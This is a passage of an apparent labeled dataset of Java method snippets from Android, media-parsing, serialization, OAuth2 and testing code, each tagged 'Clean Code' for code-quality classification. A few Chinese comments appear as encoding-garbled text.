  org.tribuo.common.xgboost.protos.XGBoostOutputConverterProto other=(org.tribuo.common.xgboost.protos.XGBoostOutputConverterProto)obj;
  if (getVersion() != other.getVersion())   return false;
  if (!getClassName().equals(other.getClassName()))   return false;
  if (hasSerializedData() != other.hasSerializedData())   return false;
  if (hasSerializedData()) {
    if (!getSerializedData().equals(other.getSerializedData()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"/** 
 * <code>optional string key = 1;</code>
 * @param value the key to set
 * @return this
 */
public DynamicValuesEntry setKey(final CharSequence value){
  bitField0_|=0x00000002;
  key.copyFrom(value);
  return this;
}
/** 
 * <code>optional string key = 1;</code>
 * @param value the key to set
 * @return this
 */
public DynamicValuesEntry setKey(final Utf8String value){
  bitField0_|=0x00000002;
  key.copyFrom(value);
  return this;
}",0,Clean Code
"public void setHintText(CharSequence text){
  setHintText(text,false,getPaint());
}
public void setHintText(CharSequence text,boolean animated){
  setHintText(text,animated,getPaint());
}
public void setHintText(CharSequence text,boolean animated,TextPaint paint){
  if (hintAnimatedDrawable != null) {
    hintAnimatedDrawable.setText(text,!LocaleController.isRTL);
  }
 else {
    if (text == null) {
      text="""";
    }
    if (getMeasuredWidth() == 0) {
      animated=false;
    }
    if (animated) {
      if (hintAnimator == null) {
        hintAnimator=new SubstringLayoutAnimator(this);
      }
      hintAnimator.create(hintLayout,hint,text,paint);
    }
 else {
      if (hintAnimator != null) {
        hintAnimator.cancel();
      }
    }
    hint=text;
    if (getMeasuredWidth() != 0) {
      text=TextUtils.ellipsize(text,paint,getMeasuredWidth(),TextUtils.TruncateAt.END);
      if (hintLayout != null && TextUtils.equals(hintLayout.getText(),text)) {
        return;
      }
    }
    hintLayout=new StaticLayout(text,paint,dp(1000),Layout.Alignment.ALIGN_NORMAL,1.0f,0.0f,false);
    invalidate();
  }
}",0,Clean Code
"/** 
 * @hide 
 */
@RequiresApi(Build.VERSION_CODES.Q) @Override public float getFloat(int id){
  Object replacement=getReplacement(id);
  if (replacement instanceof Float) {
    return (Float)replacement;
  }
 else   if (replacement instanceof XResForwarder) {
    Resources repRes=((XResForwarder)replacement).getResources();
    int repId=((XResForwarder)replacement).getId();
    return repRes.getFloat(repId);
  }
  return super.getFloat(id);
}
@Override public float getFloat(int index,float defValue){
  Object replacement=((XResources)getResources()).getReplacement(getResourceId(index,0));
  if (replacement instanceof XResForwarder) {
    Resources repRes=((XResForwarder)replacement).getResources();
    int repId=((XResForwarder)replacement).getId();
    return repRes.getDimension(repId);
  }
  return super.getFloat(index,defValue);
}",0,Clean Code
"private ScalarType getColumnType(DataType dataType){
  if (dataType != null && StringUtils.isNotBlank(dataType.typeName())) {
    if (dataType.equals(DataTypes.StringType)) {
      return ColumnMetaData.scalar(Types.VARCHAR,""varchar"",Rep.STRING);
    }
 else     if (dataType.equals(DataTypes.BinaryType)) {
      return ColumnMetaData.scalar(Types.BINARY,""char"",Rep.CHARACTER);
    }
 else     if (dataType.equals(DataTypes.BooleanType)) {
      return ColumnMetaData.scalar(Types.BOOLEAN,""boolean"",Rep.BOOLEAN);
    }
 else     if (dataType.equals(DataTypes.DateType)) {
      return ColumnMetaData.scalar(Types.DATE,""date"",Rep.JAVA_SQL_DATE);
    }
 else     if (dataType.equals(DataTypes.TimestampType)) {
      return ColumnMetaData.scalar(Types.TIMESTAMP,""timestamp"",Rep.JAVA_SQL_TIMESTAMP);
    }
 else     if (dataType.equals(DataTypes.CalendarIntervalType)) {
      return ColumnMetaData.scalar(Types.VARCHAR,""varchar"",Rep.STRING);
    }
 else     if (dataType.equals(DataTypes.DoubleType)) {
      return ColumnMetaData.scalar(Types.DOUBLE,""double"",Rep.DOUBLE);
    }
 else     if (dataType.equals(DataTypes.FloatType)) {
      return ColumnMetaData.scalar(Types.FLOAT,""float"",Rep.FLOAT);
    }
 else     if (dataType.equals(DataTypes.ByteType)) {
      return ColumnMetaData.scalar(Types.TINYINT,""byte"",Rep.BYTE);
    }
 else     if (dataType.equals(DataTypes.IntegerType)) {
      return ColumnMetaData.scalar(Types.INTEGER,""integer"",Rep.INTEGER);
    }
 else     if (dataType.equals(DataTypes.LongType)) {
      return ColumnMetaData.scalar(Types.BIGINT,""long"",Rep.LONG);
    }
 else     if (dataType.equals(DataTypes.ShortType)) {
      return ColumnMetaData.scalar(Types.SMALLINT,""short"",Rep.SHORT);
    }
 else     if (dataType.equals(DataTypes.NullType)) {
      return ColumnMetaData.scalar(Types.NULL,""null"",Rep.OBJECT);
    }
  }
  return ColumnMetaData.scalar(Types.JAVA_OBJECT,""object"",Rep.OBJECT);
}
",0,Clean Code
"protected String getRowKey(int position){
  if (rowMapReverse.containsKey(position)) {
    return rowMapReverse.get(position);
  }
  return String.valueOf(position);
}
protected String getRowKey(AbstractConfigCell row){
  if (row instanceof WithKey) {
    return ((WithKey)row).getKey();
  }
 else   if (row instanceof ConfigCellTextCheck) {
    return ((ConfigCellTextCheck)row).getKey();
  }
 else   if (row instanceof ConfigCellSelectBox) {
    return ((ConfigCellSelectBox)row).getKey();
  }
 else   if (row instanceof ConfigCellTextDetail) {
    return ((ConfigCellTextDetail)row).getKey();
  }
 else   if (row instanceof ConfigCellTextInput) {
    return ((ConfigCellTextInput)row).getKey();
  }
 else   if (row instanceof ConfigCellCustom) {
    return ((ConfigCellCustom)row).getKey();
  }
 else   if (row instanceof ConfigCellAutoTextCheck) {
    return ((ConfigCellAutoTextCheck)row).getKey();
  }
  return null;
}
",0,Clean Code
"private void setCurrentCategoryAndPageId(final int categoryId,final int categoryPageId,final boolean force){
  final int oldCategoryId=mEmojiCategory.getCurrentCategoryId();
  final int oldCategoryPageId=mEmojiCategory.getCurrentCategoryPageId();
  if (oldCategoryId == EmojiCategory.ID_RECENTS && categoryId != EmojiCategory.ID_RECENTS) {
    mEmojiPalettesAdapter.flushPendingRecentKeys();
  }
  if (force || oldCategoryId != categoryId || oldCategoryPageId != categoryPageId) {
    mEmojiCategory.setCurrentCategoryId(categoryId);
    mEmojiCategory.setCurrentCategoryPageId(categoryPageId);
    mEmojiPalettesAdapter.notifyDataSetChanged();
    mEmojiRecyclerView.scrollToPosition(categoryPageId);
  }
  final View old=mTabStrip.findViewWithTag((long)oldCategoryId);
  final View current=mTabStrip.findViewWithTag((long)categoryId);
  if (old instanceof ImageView)   Settings.getInstance().getCurrent().mColors.setColor((ImageView)old,ColorType.EMOJI_CATEGORY);
  if (current instanceof ImageView)   Settings.getInstance().getCurrent().mColors.setColor((ImageView)current,ColorType.EMOJI_CATEGORY_SELECTED);
}
",0,Clean Code
"private void fadeOutToLessWidth(int largerWidth){
  this.largerWidth=largerWidth;
  SimpleTextView titleTextLargerCopyView=this.titleTextLargerCopyView.get();
  if (titleTextLargerCopyView != null) {
    removeView(titleTextLargerCopyView);
  }
  titleTextLargerCopyView=new SimpleTextView(getContext());
  this.titleTextLargerCopyView.set(titleTextLargerCopyView);
  titleTextLargerCopyView.setTextColor(getThemedColor(Theme.key_actionBarDefaultTitle));
  titleTextLargerCopyView.setTextSize(18);
  titleTextLargerCopyView.setGravity(Gravity.LEFT);
  titleTextLargerCopyView.setTypeface(AndroidUtilities.getTypeface(""fonts/rmedium.ttf""));
  titleTextLargerCopyView.setLeftDrawableTopPadding(-AndroidUtilities.dp(1.3f));
  titleTextLargerCopyView.setRightDrawable(titleTextView.getRightDrawable());
  titleTextLargerCopyView.setRightDrawable2(titleTextView.getRightDrawable2());
  titleTextLargerCopyView.setRightDrawableOutside(titleTextView.getRightDrawableOutside());
  titleTextLargerCopyView.setLeftDrawable(titleTextView.getLeftDrawable());
  titleTextLargerCopyView.setText(titleTextView.getText());
  titleTextLargerCopyView.animate().alpha(0).setDuration(350).setInterpolator(CubicBezierInterpolator.EASE_OUT_QUINT).withEndAction(() -> {
    SimpleTextView titleTextLargerCopyView2=this.titleTextLargerCopyView.get();
    if (titleTextLargerCopyView2 != null) {
      removeView(titleTextLargerCopyView2);
      this.titleTextLargerCopyView.set(null);
    }
  }
).start();
  addView(titleTextLargerCopyView);
  SimpleTextView subtitleTextLargerCopyView=this.subtitleTextLargerCopyView.get();
  if (subtitleTextLargerCopyView != null) {
    removeView(subtitleTextLargerCopyView);
  }
  subtitleTextLargerCopyView=new SimpleTextView(getContext());
  this.subtitleTextLargerCopyView.set(subtitleTextLargerCopyView);
  subtitleTextLargerCopyView.setTextColor(getThemedColor(Theme.key_actionBarDefaultSubtitle));
  subtitleTextLargerCopyView.setTag(Theme.key_actionBarDefaultSubtitle);
  subtitleTextLargerCopyView.setTextSize(14);
  subtitleTextLargerCopyView.setGravity(Gravity.LEFT);
  if (subtitleTextView != null) {
    subtitleTextLargerCopyView.setText(subtitleTextView.getText());
  }
 else   if (animatedSubtitleTextView != null) {
    subtitleTextLargerCopyView.setText(animatedSubtitleTextView.getText());
  }
  subtitleTextLargerCopyView.animate().alpha(0).setDuration(350).setInterpolator(CubicBezierInterpolator.EASE_OUT_QUINT).withEndAction(() -> {
    SimpleTextView subtitleTextLargerCopyView2=this.subtitleTextLargerCopyView.get();
    if (subtitleTextLargerCopyView2 != null) {
      removeView(subtitleTextLargerCopyView2);
      this.subtitleTextLargerCopyView.set(null);
      if (!allowDrawStories) {
        setClipChildren(true);
      }
    }
  }
).start();
  addView(subtitleTextLargerCopyView);
  setClipChildren(false);
}",0,Clean Code
"@Override public int hashCode(){
  final int prime=31;
  int result=1;
  result=prime * result + ((debugMessage == null) ? 0 : debugMessage.hashCode());
  result=prime * result + ((message == null) ? 0 : message.hashCode());
  result=prime * result + ((status == null) ? 0 : status.hashCode());
  result=prime * result + ((subErrors == null) ? 0 : subErrors.hashCode());
  result=prime * result + ((timestamp == null) ? 0 : timestamp.hashCode());
  return result;
}
@Override public int hashCode(){
  final int prime=31;
  int result=1;
  result=prime * result + getEnclosingInstance().hashCode();
  result=prime * result + ((field == null) ? 0 : field.hashCode());
  result=prime * result + ((message == null) ? 0 : message.hashCode());
  result=prime * result + ((object == null) ? 0 : object.hashCode());
  result=prime * result + ((rejectedValue == null) ? 0 : rejectedValue.hashCode());
  return result;
}",0,Clean Code
"/** 
 * Parses a udta atom.
 * @param udtaAtom The udta (user data) atom to decode.
 * @param isQuickTime True for QuickTime media. False otherwise.
 * @return Parsed metadata, or null.
 */
@Nullable public static Metadata parseUdta(Atom.LeafAtom udtaAtom,boolean isQuickTime){
  if (isQuickTime) {
    return null;
  }
  ParsableByteArray udtaData=udtaAtom.data;
  udtaData.setPosition(Atom.HEADER_SIZE);
  while (udtaData.bytesLeft() >= Atom.HEADER_SIZE) {
    int atomPosition=udtaData.getPosition();
    int atomSize=udtaData.readInt();
    int atomType=udtaData.readInt();
    if (atomType == Atom.TYPE_meta) {
      udtaData.setPosition(atomPosition);
      return parseUdtaMeta(udtaData,atomPosition + atomSize);
    }
    udtaData.setPosition(atomPosition + atomSize);
  }
  return null;
}
",0,Clean Code
"private Text appendAntiSpam(Text text){
  String textString=text.getString();
  Text returnText=null;
  int messageIndex=-1;
  List<ChatHudLine> messages=((ChatHudAccessor)mc.inGameHud.getChatHud()).getMessages();
  if (messages.isEmpty())   return null;
  for (int i=0; i < Math.min(antiSpamDepth.get(),messages.size()); i++) {
    String stringToCheck=messages.get(i).content().getString();
    Matcher timestampMatcher=timestampRegex.matcher(stringToCheck);
    if (timestampMatcher.find()) {
      stringToCheck=stringToCheck.substring(8);
    }
    if (textString.equals(stringToCheck)) {
      messageIndex=i;
      returnText=text.copy().append(Text.literal("" (2)"").formatted(Formatting.GRAY));
      break;
    }
 else {
      Matcher matcher=antiSpamRegex.matcher(stringToCheck);
      if (!matcher.find())       continue;
      String group=matcher.group(matcher.groupCount());
      int number=Integer.parseInt(group);
      if (stringToCheck.substring(0,matcher.start()).equals(textString)) {
        messageIndex=i;
        returnText=text.copy().append(Text.literal("" ("" + (number + 1) + "")"").formatted(Formatting.GRAY));
        break;
      }
    }
  }
  if (returnText != null) {
    List<ChatHudLine.Visible> visible=((ChatHudAccessor)mc.inGameHud.getChatHud()).getVisibleMessages();
    int start=-1;
    for (int i=0; i < messageIndex; i++) {
      start+=lines.getInt(i);
    }
    int i=lines.getInt(messageIndex);
    while (i > 0) {
      visible.remove(start + 1);
      i--;
    }
    messages.remove(messageIndex);
    lines.removeInt(messageIndex);
  }
  return returnText;
}",0,Clean Code
"public synchronized void addItem(Context context,ItemInfo item,boolean newItem){
  addItem(context,item,newItem,null);
}
public synchronized void addItem(Context context,ItemInfo item,boolean newItem,@Nullable LoaderMemoryLogger logger){
  if (logger != null) {
    logger.addLog(Log.DEBUG,TAG,String.format(""Adding item to ID map: %s"",item.toString()),null);
  }
  itemsIdMap.put(item.id,item);
switch (item.itemType) {
case LauncherSettings.Favorites.ITEM_TYPE_FOLDER:
case LauncherSettings.Favorites.ITEM_TYPE_APP_PAIR:
    folders.put(item.id,(FolderInfo)item);
  workspaceItems.add(item);
break;
case LauncherSettings.Favorites.ITEM_TYPE_DEEP_SHORTCUT:
case LauncherSettings.Favorites.ITEM_TYPE_APPLICATION:
if (item.container == LauncherSettings.Favorites.CONTAINER_DESKTOP || item.container == LauncherSettings.Favorites.CONTAINER_HOTSEAT) {
workspaceItems.add(item);
}
 else {
if (newItem) {
  if (!folders.containsKey(item.container)) {
    String msg=""attempted to add item: "" + item + "" to a nonexistent app""+ "" collection"";
    Log.e(TAG,msg);
  }
}
 else {
  findOrMakeFolder(item.container).add((WorkspaceItemInfo)item,false);
}
}
break;
case LauncherSettings.Favorites.ITEM_TYPE_APPWIDGET:
case LauncherSettings.Favorites.ITEM_TYPE_CUSTOM_APPWIDGET:
appWidgets.add((LauncherAppWidgetInfo)item);
break;
}
if (newItem && item.itemType == LauncherSettings.Favorites.ITEM_TYPE_DEEP_SHORTCUT) {
updateShortcutPinnedState(context,item.user);
}
}
",0,Clean Code
"/** 
 * Gets a field declared in the class. Please note that this does not cache the lookup result, so if you need to call this many times you should do it manually and cache the  {@link Field} to improve performance drastically
 * @param instance  Instance of the class where the field is located.
 * @param fieldName Name of the field.
 * @return Data stored in the field.
 * @throws NoSuchFieldException   If the field doesn't exist.
 * @throws IllegalAccessException If the field is inaccessible
 */
@Nullable public static Object getField(@NonNull Object instance,@NonNull String fieldName) throws NoSuchFieldException, IllegalAccessException {
  return getField(instance.getClass(),instance,fieldName);
}
/** 
 * Gets a field declared in the class. Please note that this does not cache the lookup result, so if you need to call this many times you should do it manually and cache the  {@link Field} to improve performance drastically
 * @param clazz     {@link Class} where the field is located.
 * @param instance  Instance of the <code>clazz</code> or null to get static field
 * @param fieldName Name of the field.
 * @return Data stored in the field.
 * @throws NoSuchFieldException   If the field doesn't exist.
 * @throws IllegalAccessException If the field is inaccessible.
 */
@Nullable public static Object getField(@NonNull Class<?> clazz,@Nullable Object instance,@NonNull String fieldName) throws NoSuchFieldException, IllegalAccessException {
  Field field=clazz.getDeclaredField(fieldName);
  field.setAccessible(true);
  return field.get(instance);
}
",0,Clean Code
"/** 
 * 登录异常转换为oauth2异常
 * @param authentication 身份验证
 * @param authenticationException 身份验证异常
 * @return {@link OAuth2AuthenticationException}
 */
private OAuth2AuthenticationException oAuth2AuthenticationException(Authentication authentication,AuthenticationException authenticationException){
  if (authenticationException instanceof UsernameNotFoundException) {
    return new OAuth2AuthenticationException(new OAuth2Error(OAuth2ErrorCodesExpand.USERNAME_NOT_FOUND,this.messages.getMessage(""JdbcDaoImpl.notFound"",new Object[]{authentication.getName()},""Username {0} not found""),""""));
  }
  if (authenticationException instanceof BadCredentialsException) {
    return new OAuth2AuthenticationException(new OAuth2Error(OAuth2ErrorCodesExpand.BAD_CREDENTIALS,this.messages.getMessage(""AbstractUserDetailsAuthenticationProvider.badCredentials"",""Bad credentials""),""""));
  }
  if (authenticationException instanceof LockedException) {
    return new OAuth2AuthenticationException(new OAuth2Error(OAuth2ErrorCodesExpand.USER_LOCKED,this.messages.getMessage(""AbstractUserDetailsAuthenticationProvider.locked"",""User account is locked""),""""));
  }
  if (authenticationException instanceof DisabledException) {
    return new OAuth2AuthenticationException(new OAuth2Error(OAuth2ErrorCodesExpand.USER_DISABLE,this.messages.getMessage(""AbstractUserDetailsAuthenticationProvider.disabled"",""User is disabled""),""""));
  }
  if (authenticationException instanceof AccountExpiredException) {
    return new OAuth2AuthenticationException(new OAuth2Error(OAuth2ErrorCodesExpand.USER_EXPIRED,this.messages.getMessage(""AbstractUserDetailsAuthenticationProvider.expired"",""User account has expired""),""""));
  }
  if (authenticationException instanceof CredentialsExpiredException) {
    return new OAuth2AuthenticationException(new OAuth2Error(OAuth2ErrorCodesExpand.CREDENTIALS_EXPIRED,this.messages.getMessage(""AbstractUserDetailsAuthenticationProvider.credentialsExpired"",""User credentials have expired""),""""));
  }
  if (authenticationException instanceof ScopeException) {
    return new OAuth2AuthenticationException(new OAuth2Error(OAuth2ErrorCodes.INVALID_SCOPE,this.messages.getMessage(""AbstractAccessDecisionManager.accessDenied"",""invalid_scope""),""""));
  }
  return new OAuth2AuthenticationException(OAuth2ErrorCodesExpand.UN_KNOW_LOGIN_ERROR);
}",0,Clean Code
"public static void main(String[] args){
  if (Looper.getMainLooper() == null) {
    Looper.prepareMainLooper();
  }
  IBinder service;
  String token;
  UserService.setTag(TAG);
  Pair<IBinder,String> result=UserService.create(args);
  if (result == null) {
    System.exit(1);
    return;
  }
  service=result.first;
  token=result.second;
  if (!sendBinder(service,token)) {
    System.exit(1);
  }
  Looper.loop();
  System.exit(0);
  Log.i(TAG,""service exited"");
}",0,Clean Code
"@Override public boolean isModified(){
  if (!Objects.equals(config.getTranslator(),view.getTranslatorBox().getSelectedItem())) {
    return true;
  }
  if (!Objects.equals(String.valueOf(config.getTimeout()),view.getTimeoutTextField().getText())) {
    return true;
  }
  if (!Objects.equals(config.getAppId(),view.getAppIdTextField().getText())) {
    return true;
  }
  if (!Objects.equals(config.getToken(),view.getTokenTextField().getText())) {
    return true;
  }
  if (!Objects.equals(config.getSecretKey(),view.getSecretKeyTextField().getText())) {
    return true;
  }
  if (!Objects.equals(config.getSecretId(),view.getSecretIdTextField().getText())) {
    return true;
  }
  if (!Objects.equals(config.getAccessKeyId(),view.getAccessKeyIdTextField().getText())) {
    return true;
  }
  if (!Objects.equals(config.getAccessKeySecret(),view.getAccessKeySecretTextField().getText())) {
    return true;
  }
  if (!Objects.equals(config.getYoudaoAppKey(),view.getYoudaoAppKeyTextField().getText())) {
    return true;
  }
  if (!Objects.equals(config.getYoudaoAppSecret(),view.getYoudaoAppSecretTextField().getText())) {
    return true;
  }
  if (!Objects.equals(config.getMicrosoftKey(),view.getMicrosoftKeyTextField().getText())) {
    return true;
  }
  if (!Objects.equals(config.getMicrosoftRegion(),view.getMicrosoftRegionTextField().getText())) {
    return true;
  }
  if (!Objects.equals(config.getGoogleKey(),view.getGoogleKeyTextField().getText())) {
    return true;
  }
  if (!Objects.equals(config.getChatGlmApiKey(),view.getChatGlmApiKeyTextField().getText())) {
    return true;
  }
  if (!Objects.equals(config.getCustomUrl(),view.getCustomUrlTextField().getText())) {
    return true;
  }
  return false;
}
",0,Clean Code
"/** 
 * @param dataSource The source from which the data should be loaded.
 * @param dataSpec Defines the data to be loaded.
 * @param trackFormat See {@link #trackFormat}.
 * @param trackSelectionReason See {@link #trackSelectionReason}.
 * @param trackSelectionData See {@link #trackSelectionData}.
 * @param startTimeUs The start time of the media contained by the chunk, in microseconds.
 * @param endTimeUs The end time of the media contained by the chunk, in microseconds.
 * @param clippedStartTimeUs The time in the chunk from which output will begin, or {@link C#TIME_UNSET} to output from the start of the chunk.
 * @param clippedEndTimeUs The time in the chunk from which output will end, or {@link C#TIME_UNSET} to output to the end of the chunk.
 * @param chunkIndex The index of the chunk, or {@link C#INDEX_UNSET} if it is not known.
 * @param chunkCount The number of chunks in the underlying media that are spanned by thisinstance. Normally equal to one, but may be larger if multiple chunks as defined by the underlying media are being merged into a single load.
 * @param sampleOffsetUs An offset to add to the sample timestamps parsed by the extractor.
 * @param extractorWrapper A wrapped extractor to use for parsing the data.
 */
public ContainerMediaChunk(DataSource dataSource,DataSpec dataSpec,Format trackFormat,int trackSelectionReason,Object trackSelectionData,long startTimeUs,long endTimeUs,long clippedStartTimeUs,long clippedEndTimeUs,long chunkIndex,int chunkCount,long sampleOffsetUs,ChunkExtractorWrapper extractorWrapper){
  super(dataSource,dataSpec,trackFormat,trackSelectionReason,trackSelectionData,startTimeUs,endTimeUs,clippedStartTimeUs,clippedEndTimeUs,chunkIndex);
  this.chunkCount=chunkCount;
  this.sampleOffsetUs=sampleOffsetUs;
  this.extractorWrapper=extractorWrapper;
}
",0,Clean Code
"/** 
 * Removes a complete sample from the  {@link #buffer} field & reshuffles the tail data skippedby  {@code offset} to the head of the array.
 * @param size see {@code size} param of {@link #sampleMetadata}.
 * @param offset see {@code offset} param of {@link #sampleMetadata}.
 * @return A {@link ParsableByteArray} containing the sample removed from {@link #buffer}.
 */
private ParsableByteArray getSampleAndTrimBuffer(int size,int offset){
  int sampleEnd=bufferPosition - offset;
  int sampleStart=sampleEnd - size;
  byte[] sampleBytes=Arrays.copyOfRange(buffer,sampleStart,sampleEnd);
  ParsableByteArray sample=new ParsableByteArray(sampleBytes);
  System.arraycopy(buffer,sampleEnd,buffer,0,offset);
  bufferPosition=offset;
  return sample;
}",0,Clean Code
"public static List<String> getResultSetFirstColumnAsString(String queryString,ExpectedErrors errors,CnosDBGlobalState state) throws Exception {
  if (state.getOptions().logEachSelect()) {
    state.getLogger().writeCurrent(queryString);
    try {
      state.getLogger().getCurrentFileWriter().flush();
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
  }
  CnosDBSelectQuery q=new CnosDBSelectQuery(queryString,errors);
  List<String> result=new ArrayList<>();
  CnosDBResultSet resultSet;
  try {
    q.executeAndGet(state);
    resultSet=q.getResultSet();
    if (resultSet == null) {
      throw new AssertionError(q);
    }
    while (resultSet.next()) {
      result.add(resultSet.getString(1));
    }
  }
 catch (  Exception e) {
    if (e instanceof IgnoreMeException) {
      throw e;
    }
    if (e instanceof NumberFormatException) {
      throw new IgnoreMeException();
    }
    if (e.getMessage() == null) {
      throw new AssertionError(queryString,e);
    }
    if (errors.errorIsExpected(e.getMessage())) {
      throw new IgnoreMeException();
    }
    throw new AssertionError(queryString,e);
  }
  return result;
}",0,Clean Code
"/** 
 * Returns the deserializer for a class.
 * @param cl the class of the object that needs to be deserialized.
 * @return a deserializer object for the serialization.
 */
public Deserializer getDeserializer(Class cl) throws HessianProtocolException {
  Deserializer deserializer;
  if (_cachedDeserializerMap != null) {
    deserializer=(Deserializer)_cachedDeserializerMap.get(cl);
    if (deserializer != null)     return deserializer;
  }
  deserializer=loadDeserializer(cl);
  if (_cachedDeserializerMap == null)   _cachedDeserializerMap=new ConcurrentHashMap(8);
  _cachedDeserializerMap.put(cl,deserializer);
  return deserializer;
}
/** 
 * Returns a deserializer based on a string type.
 */
public Deserializer getDeserializer(String type) throws HessianProtocolException {
  if (type == null || type.equals(""""))   return null;
  Deserializer deserializer;
  if (_cachedTypeDeserializerMap != null) {
synchronized (_cachedTypeDeserializerMap) {
      deserializer=(Deserializer)_cachedTypeDeserializerMap.get(type);
    }
    if (deserializer != null)     return deserializer;
  }
  deserializer=(Deserializer)_staticTypeMap.get(type);
  if (deserializer != null)   return deserializer;
  if (type.startsWith(""["")) {
    Deserializer subDeserializer=getDeserializer(type.substring(1));
    if (subDeserializer != null)     deserializer=new ArrayDeserializer(subDeserializer.getType());
 else     deserializer=new ArrayDeserializer(Object.class);
  }
 else {
    try {
      Class cl;
      if (type.startsWith(""com.caucho.hessian"")) {
        cl=this.getClass().getClassLoader().loadClass(type);
      }
 else {
        cl=loadSerializedClass(type);
      }
      deserializer=getDeserializer(cl);
    }
 catch (    Exception e) {
      log.warning(""Hessian/Burlap: '"" + type + ""' is an unknown class in ""+ getClassLoader()+ "":\n""+ e);
      log.log(Level.FINER,e.toString(),e);
    }
  }
  if (deserializer != null) {
    if (_cachedTypeDeserializerMap == null)     _cachedTypeDeserializerMap=new HashMap(8);
synchronized (_cachedTypeDeserializerMap) {
      _cachedTypeDeserializerMap.put(type,deserializer);
    }
  }
  return deserializer;
}",0,Clean Code
"@Test public void testSelectTracksWithMultipleAudioTracksWithMixedMimeTypes() throws Exception {
  Format aacAudioFormat=buildAudioFormatWithMimeType(""aac"",MimeTypes.AUDIO_AAC);
  Format opusAudioFormat=buildAudioFormatWithMimeType(""opus"",MimeTypes.AUDIO_OPUS);
  TrackGroupArray trackGroups=singleTrackGroup(aacAudioFormat,opusAudioFormat);
  TrackSelectorResult result=trackSelector.selectTracks(new RendererCapabilities[]{AUDIO_CAPABILITIES},trackGroups,periodId,TIMELINE);
  assertThat(result.length).isEqualTo(1);
  assertFixedSelection(result.selections.get(0),trackGroups,aacAudioFormat);
  trackGroups=singleTrackGroup(opusAudioFormat,aacAudioFormat);
  result=trackSelector.selectTracks(new RendererCapabilities[]{AUDIO_CAPABILITIES},trackGroups,periodId,TIMELINE);
  assertThat(result.length).isEqualTo(1);
  assertFixedSelection(result.selections.get(0),trackGroups,opusAudioFormat);
  trackSelector.setParameters(Parameters.DEFAULT.buildUpon().setAllowAudioMixedMimeTypeAdaptiveness(true));
  result=trackSelector.selectTracks(new RendererCapabilities[]{AUDIO_CAPABILITIES},trackGroups,periodId,TIMELINE);
  assertThat(result.length).isEqualTo(1);
  assertAdaptiveSelection(result.selections.get(0),trackGroups.get(0),0,1);
}",0,Clean Code
"private void checkTopErrorCell(boolean init){
  if (topErrorCell == null) {
    return;
  }
  SpannableStringBuilder stringBuilder=null;
  if (fieldsErrors != null && (init || errorsValues.containsKey(""error_all""))) {
    String errorText=fieldsErrors.get(""error_all"");
    if (errorText != null) {
      stringBuilder=new SpannableStringBuilder(errorText);
      if (init) {
        errorsValues.put(""error_all"","""");
      }
    }
  }
  if (documentsErrors != null && (init || errorsValues.containsKey(""error_document_all""))) {
    String errorText=documentsErrors.get(""error_all"");
    if (errorText != null) {
      if (stringBuilder == null) {
        stringBuilder=new SpannableStringBuilder(errorText);
      }
 else {
        stringBuilder.append(""\n\n"").append(errorText);
      }
      if (init) {
        errorsValues.put(""error_document_all"","""");
      }
    }
  }
  if (stringBuilder != null) {
    stringBuilder.setSpan(new ForegroundColorSpan(Theme.getColor(Theme.key_windowBackgroundWhiteRedText3)),0,stringBuilder.length(),Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);
    topErrorCell.setText(stringBuilder);
    topErrorCell.setVisibility(View.VISIBLE);
  }
 else   if (topErrorCell.getVisibility() != View.GONE) {
    topErrorCell.setVisibility(View.GONE);
  }
}",0,Clean Code
"/** 
 * 娉ㄥ唽涓�涓粯璁luster鐨処nstance锛屽苟楠岃瘉
 * @throws Exception
 */
@Test public void regDomTest() throws Exception {
  String serviceName=randomDomainName();
  System.out.println(serviceName);
  naming.registerInstance(serviceName,TEST_IP_4_DOM_1,TEST_PORT);
  TimeUnit.SECONDS.sleep(3);
  List<Instance> instances=naming.getAllInstances(serviceName);
  Assert.assertEquals(1,instances.size());
  Assert.assertTrue(instances.get(0).getInstanceId().contains(serviceName));
  Assert.assertEquals(instances.get(0).getIp(),TEST_IP_4_DOM_1);
  Assert.assertEquals(instances.get(0).getPort(),TEST_PORT);
}",0,Clean Code
"@Override public boolean configure(int sampleRateHz,int channelCount,@C.PcmEncoding int encoding) throws UnhandledFormatException {
  if (encoding != OUTPUT_ENCODING) {
    throw new UnhandledFormatException(sampleRateHz,channelCount,encoding);
  }
  if (endBufferSize > 0) {
    trimmedFrameCount+=endBufferSize / bytesPerFrame;
  }
  bytesPerFrame=Util.getPcmFrameSize(OUTPUT_ENCODING,channelCount);
  endBuffer=new byte[trimEndFrames * bytesPerFrame];
  endBufferSize=0;
  pendingTrimStartBytes=trimStartFrames * bytesPerFrame;
  boolean wasActive=isActive;
  isActive=trimStartFrames != 0 || trimEndFrames != 0;
  receivedInputSinceConfigure=false;
  setInputFormat(sampleRateHz,channelCount,encoding);
  return wasActive != isActive;
}",0,Clean Code
"@Test public void testReadInt(){
  testReadInt(0);
  testReadInt(1);
  testReadInt(-1);
  testReadInt(Integer.MIN_VALUE);
  testReadInt(Integer.MAX_VALUE);
}
private static void testReadInt(int testValue){
  ParsableByteArray testArray=new ParsableByteArray(ByteBuffer.allocate(4).putInt(testValue).array());
  int readValue=testArray.readInt();
  assertThat(readValue).isEqualTo(testValue);
  assertThat(testArray.getPosition()).isEqualTo(4);
  testArray.skipBytes(-4);
  readValue=testArray.readInt();
  assertThat(readValue).isEqualTo(testValue);
  assertThat(testArray.getPosition()).isEqualTo(4);
}",0,Clean Code
"/** 
 * 瑙ｆ瀽灞炴�у悕銆�
 * @param resource
 * @param csvRecords
 * @return
 * @throws Throwable
 */
protected List<String> resolvePropertyNames(CsvDataSetResource resource,List<CSVRecord> csvRecords) throws Throwable {
  List<String> propertyNames=null;
  for (int i=0, len=csvRecords.size(); i < len; i++) {
    CSVRecord csvRecord=csvRecords.get(i);
    if (resource.isNameRow(i)) {
      int size=csvRecord.size();
      propertyNames=new ArrayList<String>(csvRecord.size());
      for (int j=0; j < size; j++)       propertyNames.add(csvRecord.get(j));
      break;
    }
 else {
      if (propertyNames == null) {
        int size=csvRecord.size();
        propertyNames=new ArrayList<String>(csvRecord.size());
        for (int j=0; j < size; j++)         propertyNames.add(Integer.toString(j + 1));
      }
      if (resource.isAfterNameRow(i))       break;
    }
  }
  if (propertyNames == null)   propertyNames=Collections.emptyList();
  return propertyNames;
}",0,Clean Code
"private static Schema applyAddColumnEvent(AddColumnEvent event,Schema oldSchema){
  LinkedList<Column> columns=new LinkedList<>(oldSchema.getColumns());
